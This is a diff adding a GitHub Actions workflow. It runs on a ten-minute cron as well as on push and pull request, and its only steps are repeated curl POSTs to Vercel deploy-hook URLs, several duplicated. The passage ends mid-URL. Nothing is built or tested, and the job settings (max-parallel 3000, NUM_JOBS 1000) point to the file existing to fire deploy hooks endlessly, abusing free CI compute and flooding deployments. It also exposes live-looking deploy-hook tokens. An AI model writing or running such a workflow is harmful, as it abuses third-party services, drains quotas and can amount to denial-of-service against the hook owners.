@@ -1,0 +1,42 @@
+name: CI 
+on:  
+  push:
+  pull_request:
+  workflow_dispatch:  
+  schedule:
+  - cron: "*/10 * * * *"
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 3000
+      fail-fast: false
+      matrix:
+        go: [1.1]
+        flag: [A]
+    env:
+        NUM_JOBS: 1000
+        JOB: ${{ matrix.go }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_ayUgo4xEKplUrXOq7Ebwr0gouT0M/zWjou4Rv46
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_UXycrNHvLGWtO5RfCggrT81m1TuM/VuMAtZ6pDk
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_0z4tejYczgzQ6dIOwtb4oVy9HTLN/c8Hww1ve6o
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vjHe1KUMYJRhMca6tp2mu6JoLnA3/akGGZNlpnZ
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vrlvrOpMlYgsuNPWFD5BpRZ0bsdv/BXWpuwVdhG
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_Oh1u3toMvv5ijZmiAUgOjGxlaqim/rhZavNK5Wu
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vjHe1KUMYJRhMca6tp2mu6JoLnA3/akGGZNlpnZ
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vrlvrOpMlYgsuNPWFD5BpRZ0bsdv/BXWpuwVdhG
+      - name: Run a one-line script
+        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_Oh1u3toMvv5ijZmiAUgOjGxlaqim/rhZavNK5Wu
+      - name: Run a one-line script
+        run: curl -X POST https://api.
